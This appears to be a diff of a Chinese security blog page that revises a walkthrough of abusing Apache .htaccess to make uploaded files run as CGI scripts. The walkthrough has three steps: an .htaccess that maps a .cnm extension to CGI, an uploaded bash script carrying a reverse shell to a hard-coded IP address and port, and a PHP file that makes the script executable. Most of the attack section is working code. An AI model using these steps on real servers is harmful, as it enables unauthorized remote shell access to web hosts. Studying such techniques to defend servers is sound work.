@@ -743,14 +743,16 @@ Options +ExecCGI                      #这便是允许cgi程序执行，在“/v
 
 AddHandler cgi-script .cnm
 </code></pre><h2 id="攻击原理和方式"><a href="#攻击原理和方式" class="headerlink" title="攻击原理和方式"></a>攻击原理和方式</h2><p><strong>步骤：</strong></p>
-<p>1.在Apache允许执行cgi脚本的目录下放入<code>.htaccess</code>文件，用于把你上传的某个文件解析成cgi脚本</p>
+<p>1.在Apache允许允许使用<code>.htaccess</code> 的目录 放入<code>.htaccess</code>文件，用于把你上传的某个文件解析成cgi脚本。如果Apache本来就允许某个目录执行cgi脚本，则可以省略这一步骤。</p>
 <pre><code>Options +ExecCGI
 
 AddHandler cgi-script .cnm        //把.cnm后缀的文件按cgi脚本解析</code></pre><p>2.上传你的cgi脚本</p>
 <p>例如</p>
-<pre><code>#!/bin/bash
-echo -ne "Content-Type: text/html\n\n"          //如果要进行反弹shell才需要这条命令，否则会500。使用其它命令则可以直接执行
-bash -i &gt;&amp; /dev/tcp/121.4.101.246/9999 0&gt;&amp;1        //反弹shell或者任意www-data用户可以执行的命令都可以</code></pre><p>3.上传一个php或者html文件引用执行这个cgi脚本</p>
+<pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bash
+echo -ne "Content-Type: text/html\n\n"          //如果要进行反弹shell才需要这条命令，否则会500
+//使用其它命令则可以直接执行,不需要上面这条语句
+bash -i >& /dev/tcp/121.4.101.246/9999 0>&1        //反弹shell或者任意www-data用户可以执行的命令都可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>3.上传一个php或者html文件引用执行这个cgi脚本</p>
 <p>例如</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"cgi.cnm"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//记住必须要为cgi脚本赋予执行权限</span>
@@ -1156,7 +1158,7 @@ bash -i &gt;&amp; /dev/tcp/121.4.101.246/9999 0&gt;&amp;1        //反弹shell�
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">89.8k</span> 字
+                <span class="white-color">89.9k</span> 字
             
 
             
